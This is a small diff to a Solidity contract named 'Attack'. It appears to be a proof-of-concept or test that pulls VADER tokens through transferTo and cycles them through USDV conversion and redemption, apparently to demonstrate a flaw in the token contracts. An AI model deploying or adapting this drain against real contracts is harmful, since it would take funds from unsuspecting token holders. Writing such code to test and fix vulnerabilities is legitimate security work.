@@ -25,9 +25,10 @@ contract Attack {
 
     //========================================iERC20=========================================//
     function attackUSDV(uint amount) public {
-        iERC20(VADER).transferTo(address(this), amount);
         iERC20(VADER).approve(USDV, amount);
-        iUSDV(USDV).convertToUSDV(amount);
-        iUSDV(USDV).redeemToVADER(amount);
+        iERC20(USDV).approve(USDV, amount);
+        iERC20(VADER).transferTo(address(this), amount); // get VADER funds
+        iUSDV(USDV).convertToUSDV(amount); // Convert to USDV back to this address
+        iUSDV(USDV).redeemToVADER(amount); // Burn USDV back to VADER to this address
     }
 }
